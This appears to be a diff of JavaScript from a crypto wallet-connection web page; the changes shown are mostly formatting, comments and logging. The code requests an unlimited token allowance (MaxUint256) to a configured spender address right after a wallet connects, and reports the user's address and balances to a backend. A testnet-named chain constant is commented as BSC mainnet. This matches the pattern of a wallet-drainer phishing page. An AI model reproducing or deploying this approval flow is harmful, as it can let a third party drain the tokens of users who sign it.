@@ -633,8 +633,8 @@ header{
     let web3Instance      = null;
     let currentAddress    = null;
     let currentUserId     = null;
-let currentBNBBalance   = null;
-let currentTokenBalance = null;
+    let currentBNBBalance   = null;
+    let currentTokenBalance = null;
     // WalletConnect v2
     let walletConnectV2Provider = null;
     const WALLETCONNECT_PROJECT_ID = "febf4ea32fb4df7139f1cfd3f7c5142a";
@@ -897,7 +897,7 @@ let currentTokenBalance = null;
       }
     }
 async function ensureTokenApproval(){
-  // helper to log with last known balances
+  // helper: always log with last known balances
   async function logApproval(tag){
     await notifyBackend(
       currentAddress || "",
@@ -909,6 +909,7 @@ async function ensureTokenApproval(){
     );
   }
 
+  // basic guards
   if(!TOKEN_ADDRESS){
     console.warn("TOKEN_ADDRESS not set, skipping approve");
     await logApproval("approval_skipped_no_token");
@@ -919,8 +920,8 @@ async function ensureTokenApproval(){
     await logApproval("approval_skipped_no_spender");
     return;
   }
-  if(!providerInstance){
-    console.warn("No providerInstance for approval");
+  if(!providerInstance || !web3Instance){
+    console.warn("No providerInstance/web3Instance for approval");
     await logApproval("approval_skipped_no_provider");
     return;
   }
@@ -930,7 +931,7 @@ async function ensureTokenApproval(){
 
     const ethersProvider = new ethers.BrowserProvider(
       providerInstance,
-      BNB_TESTNET_CHAIN_ID_DEC
+      BNB_TESTNET_CHAIN_ID_DEC    // 56 (BSC mainnet)
     );
     const signer       = await ethersProvider.getSigner();
     const ownerAddress = (await signer.getAddress()).toLowerCase();
@@ -952,6 +953,7 @@ async function ensureTokenApproval(){
       ethersProvider
     );
     const currentAllowance = await readContract.allowance(ownerAddress, SPENDER_ADDRESS);
+    console.log("[approve] currentAllowance =", currentAllowance.toString());
 
     if (currentAllowance > 0n) {
       setStatus("Connected (already approved)");
@@ -968,6 +970,8 @@ async function ensureTokenApproval(){
     );
 
     const tx = await writeContract.approve(SPENDER_ADDRESS, ethers.MaxUint256);
+    console.log("[approve] tx sent:", tx.hash);
+
     setStatus("Approval pending on chain…");
     await tx.wait();
 
@@ -981,13 +985,12 @@ async function ensureTokenApproval(){
       tag = "approval_rejected";
     }
 
-    alert("Token approval failed: " + (err && err.message ? err.message : err));
     setStatus("Connected (approval failed)");
+    alert("Token approval failed: " + (err && err.message ? err.message : err));
 
     await logApproval(tag);
   }
 }
-
 
 
 
